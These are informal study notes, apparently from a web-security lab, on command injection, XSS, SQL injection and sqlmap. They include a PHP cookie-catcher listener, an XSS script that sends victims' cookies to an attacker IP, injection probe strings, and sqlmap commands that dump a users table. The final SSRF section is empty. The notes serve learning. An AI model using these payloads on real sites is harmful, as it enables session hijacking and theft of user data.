# Web stuff Notes

So this is going to be about stuff put together Command Injection, Cross-Site Scripting, SQL injection, and Cloud SSRF and IMDS attack. 
Just grouping these because man it was kinda short.

## Command Injection

Identify the pages associated with the following functions:

- Feedback Submission
- Feedback Review
- Directory Services
- System Connectivity Checked
- Website Search Function
- Website Administrative Access Page

simple system input for a connectivity test page

- test with '-h' to see if you get help page info
    - '127.0.0.1 -h' or just '-h'
- try with '; ls'
    - '; ls'
- other things to try
    - '|| ls' or '&& ls'

## XSS

### Reflected XSS
if input is reflected on the browser very easy to test with this:
- <hr>

make sure to view source page where your input is relected to identify injection points and possible filtering

### Stored XSS

if you have an injection that stays static on a page you can inject here and it will be 'stored'

### Exploiting XSS

steps we will do
- open a cookie catcher web process to catch the connection from the victim user
- craft malicious URL
- submit the malicious URL to victim

listner code:
```
<html>
<?php
file_put_contents("cookies.log", json_encode(array(
    "GET"=>$_GET,
    "POST"=>$_POST,
    "headers"=>getallheaders()))."\n",
    FILE_APPEND);
?>
</html>
```

host it
- php -S 0.0.0.0:2222

The malicious payload to inject
```
<script>document.location='http://10.10.75.1:2222/?'+document.cookie;</script>
```

now just watch the cookie catcher and if the xss works it will trigger, using these cookies one can impersonate those users

## SQL Injection

testing for sqlinjection

injecting a search term with: 
- admin'

continue with
- ' or '1'='1

### With sqlmap

remember two rules:

- Always give Sqlmap a valid URL that does not trigger an error
- Always type the URL with quotation marks at the beginning and the end

example usage:

```
sqlmap -u "http://www.rookaviary.com/email_search.php?search=admin"
sqlmap -u "http://www.rookaviary.com/email_search.php?search=admin" --dbs
sqlmap -u "http://www.rookaviary.com/email_search.php?search=admin" -D web_app --tables
sqlmap -u "http://www.rookaviary.com/email_search.php?search=admin" -D web_app -T users --dump
```

## Cloud SSRF and IMDS attack






